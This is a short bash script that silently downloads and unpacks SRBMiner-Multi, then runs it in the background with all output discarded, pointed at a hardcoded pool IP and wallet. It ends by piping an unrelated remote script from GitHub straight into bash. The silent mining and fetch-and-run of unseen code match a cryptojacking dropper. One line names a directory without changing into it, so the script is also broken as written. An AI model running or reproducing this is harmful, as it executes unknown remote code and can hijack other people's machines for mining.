#!/bin/bash
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.4/SRBMiner-Multi-3-3-4-Linux.tar.gz >/dev/null 2>&1
tar xzf SRBMiner-Multi-3-3-4-Linux.tar.gz
SRBMiner-Multi-3-3-4
./SRBMiner-MULTI --disable-cpu --algorithm pearlhash --pool 95.111.195.159:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.RTX >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
